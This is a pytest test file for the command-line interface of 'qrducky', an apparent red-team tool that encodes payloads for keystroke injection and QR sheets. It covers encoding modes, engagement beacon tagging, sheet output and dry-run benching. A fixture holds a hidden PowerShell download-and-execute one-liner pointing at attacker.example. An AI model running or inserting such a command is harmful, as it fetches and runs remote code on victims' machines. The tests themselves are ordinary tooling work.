"""CLI contract tests (#2): surface, exit codes, structured stderr, engagement."""

import json
import os

import pytest

from qrducky.cli import main

SAMPLE_ONE_LINER = (
    "powershell -nop -w hidden -c "
    "IEX((New-Object Net.WebClient).DownloadString('http://attacker.example/s'))"
)

@pytest.fixture
def payload_file(tmp_path):
    p = tmp_path / "payload.txt"
    p.write_text(SAMPLE_ONE_LINER)
    return str(p)

@pytest.fixture
def config_file(tmp_path):
    cfg = tmp_path / "qrducky.toml"
    cfg.write_text(
        "[sheet]\nmodule_mm = 4.0\nec = \"M\"\n"
        "\n[bench]\ndefault_repeat = 5\n"
        "\n[bench.targets.vm-alpha]\nserial_port = \"\"\nbaud = 115200\nlayout = \"US\"\n"
        "\n[engagement.targets.vm-alpha]\nmethod = \"url-param\"\n"
        "\n[engagement.targets.vm-bravo]\nmethod = \"ps-comment\"\n"
    )
    return str(cfg)

def run(monkeypatch, capsys, *argv):
    monkeypatch.setattr("sys.argv", ["qr-ducky", *argv])
    code = main(argv)
    captured = capsys.readouterr()
    return code, captured.out, captured.err

class TestEncode:
    def test_encode_alnum_stdout_text(self, monkeypatch, capsys, payload_file):
        code, out, err = run(monkeypatch, capsys, "encode",
                             "--payload", payload_file, "--mode", "alnum")
        assert code == 0
        text = out.strip()
        assert text and set(text) <= set("BCDEFGHIJKLNOPRSTUVX")

    def test_encode_hex_and_b64(self, monkeypatch, capsys, payload_file):
        for mode, charset in (("hex", "0123456789ABCDEF"),
                              ("b64",
                               "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                               "abcdefghijklmnopqrstuvwxyz0123456789+/=")):
            code, out, _ = run(monkeypatch, capsys, "encode",
                               "--payload", payload_file, "--mode", mode)
            assert code == 0
            assert set(out.strip()) <= set(charset)

    def test_encode_stdin(self, monkeypatch, capsys):
        import io
        monkeypatch.setattr("sys.stdin", io.TextIOWrapper(
            io.BytesIO(SAMPLE_ONE_LINER.encode()), encoding="utf-8"))
        code, out, _ = run(monkeypatch, capsys, "encode", "--payload", "-",
                           "--mode", "hex")
        assert code == 0 and out.strip()

    def test_encode_json_flag(self, monkeypatch, capsys, payload_file):
        code, out, _ = run(monkeypatch, capsys, "encode", "--payload",
                          payload_file, "--mode", "alnum", "--layout", "FR",
                          "--json")
        assert code == 0
        data = json.loads(out)
        assert data["portable"] is True
        assert data["mode"] == "alnum" and data["layout"] == "FR"
        assert data["keystrokes"] and data["decoder_hint"]

    def test_b64_non_us_layout_warns_on_stderr(self, monkeypatch, capsys,
                                               payload_file):
        code, out, err = run(monkeypatch, capsys, "encode", "--payload",
                             payload_file, "--mode", "b64", "--layout", "DE")
        assert code == 0
        rec = json.loads(err.strip().splitlines()[-1])
        assert rec["level"] == "warn" and "layout-port" in rec["msg"]

    def test_encode_missing_file_structured_error(self, monkeypatch, capsys):
        code, _, err = run(monkeypatch, capsys, "encode", "--payload",
                           "/nonexistent")
        assert code == 1
        rec = json.loads(err.strip().splitlines()[-1])
        assert rec["level"] == "error" and rec["cmd"] == "encode"

class TestEngagement:
    def test_url_param_beacon(self, monkeypatch, capsys, payload_file,
                              config_file):
        code, out, _ = run(monkeypatch, capsys, "encode", "--payload",
                           payload_file, "--mode", "hex", "--json",
                           "--beacon-id", "LAB-042", "--engage-target",
                           "vm-alpha", "--config", config_file)
        assert code == 0
        from qrducky import decode
        stamped = decode(json.loads(out)["text"], "hex").decode()
        assert "http://attacker.example/s?bid=LAB-042" in stamped

    def test_ps_comment_beacon(self, monkeypatch, capsys, tmp_path, config_file):
        p = tmp_path / "p.txt"
        p.write_text("Write-Host ok")
        code, out, _ = run(monkeypatch, capsys, "encode", "--payload", str(p),
                           "--mode", "hex", "--json", "--beacon-id", "LAB-7",
                           "--engage-target", "vm-bravo", "--config", config_file)
        assert code == 0
        from qrducky import decode
        stamped = decode(json.loads(out)["text"], "hex").decode()
        assert stamped == "Write-Host ok # LAB-7"

    def test_beacon_requires_target(self, monkeypatch, capsys, payload_file):
        code, _, err = run(monkeypatch, capsys, "encode", "--payload",
                           payload_file, "--beacon-id", "X")
        assert code == 2
        assert "engage-target" in err

    def test_undeclared_target_rejected(self, monkeypatch, capsys, payload_file,
                                        config_file):
        code, _, err = run(monkeypatch, capsys, "encode", "--payload",
                           payload_file, "--beacon-id", "X",
                           "--engage-target", "vm-gamma", "--config",
                           config_file)
        assert code == 1  # config lookup fails at runtime, structured
        assert "vm-gamma" in err

class TestSheet:
    def test_sheet_pdf_end_to_end(self, monkeypatch, capsys, payload_file):
        import tempfile
        d = tempfile.mkdtemp()
        out = os.path.join(d, "sheet.pdf")
        code, _, err = run(monkeypatch, capsys, "sheet", "--payload",
                           payload_file, "--out", out, "--module", "3",
                           "--ec", "M")
        assert code == 0
        assert os.path.isfile(out)
        assert open(out, "rb").read(5) == b"%PDF-"
        rec = json.loads(err.strip().splitlines()[-1])
        assert rec["level"] == "info" and "wrote" in rec["msg"]

    def test_sheet_with_encoding(self, monkeypatch, capsys, payload_file):
        import tempfile
        d = tempfile.mkdtemp()
        out = os.path.join(d, "s.png")
        code, _, _ = run(monkeypatch, capsys, "sheet", "--payload",
                         payload_file, "--out", out, "--mode", "alnum",
                         "--layout", "FR", "--module", "2")
        assert code == 0 and os.path.isfile(out)

    def test_sheet_also_png(self, monkeypatch, capsys, payload_file):
        import tempfile
        d = tempfile.mkdtemp()
        out = os.path.join(d, "s.pdf")
        code, _, err = run(monkeypatch, capsys, "sheet", "--payload",
                           payload_file, "--out", out, "--png",
                           "--module", "2")
        assert code == 0
        assert os.path.isfile(out)
        assert os.path.isfile(out[:-4] + ".png")

    def test_sheet_error_structured(self, monkeypatch, capsys, tmp_path):
        p = tmp_path / "p.txt"
        p.write_text("A" * 5000)
        out = str(tmp_path / "s.pdf")
        code, _, err = run(monkeypatch, capsys, "sheet", "--payload", str(p),
                          "--out", out)
        assert code == 1
        rec = json.loads(err.strip().splitlines()[-1])
        assert rec["level"] == "error"

    def test_sheet_block_too_big_rejected(self, monkeypatch, capsys,
                                          payload_file):
        import tempfile
        d = tempfile.mkdtemp()
        out = os.path.join(d, "s.pdf")
        code, _, err = run(monkeypatch, capsys, "sheet", "--payload",
                          payload_file, "--out", out, "--module", "8")
        assert code == 1
        rec = json.loads(err.strip().splitlines()[-1])
        assert "exceeds usable page" in rec["msg"]

class TestBench:
    def test_bench_dry_run_full_conversation(self, monkeypatch, capsys,
                                             payload_file, config_file):
        code, out, err = run(monkeypatch, capsys, "bench", "--target",
                             "vm-alpha", "--repeat", "2", "--payload",
                             payload_file, "--dry-run", "--config",
                             config_file)
        assert code == 0
        stats = json.loads(out)
        assert stats["dry_run"] is True and stats["repeat"] == 2
        assert stats["runs"][0]["session"] == "bench-vm-alpha-001"
        assert "> BEGIN" in err and "< DRY ACK" in err
        assert "> END" in err

    def test_bench_live_boundary_structured(self, monkeypatch, capsys,
                                            payload_file, config_file):
        code, _, err = run(monkeypatch, capsys, "bench", "--target",
                           "vm-alpha", "--payload", payload_file,
                           "--config", config_file)
        assert code == 3
        rec = json.loads(err.strip().splitlines()[-1])
        assert rec["status"] == "not_implemented"
        assert "serial_port" in rec["msg"]

    def test_bench_requires_explicit_payload(self, monkeypatch, capsys,
                                             config_file):
        code, _, err = run(monkeypatch, capsys, "bench", "--target",
                           "vm-alpha", "--config", config_file)
        assert code == 2
        assert "no payload" in err

    def test_bench_undeclared_target_config_error(self, monkeypatch, capsys,
                                                  config_file):
        code, _, err = run(monkeypatch, capsys, "bench", "--target", "ghost",
                           "--config", config_file)
        assert code == 2
        assert "ghost" in err
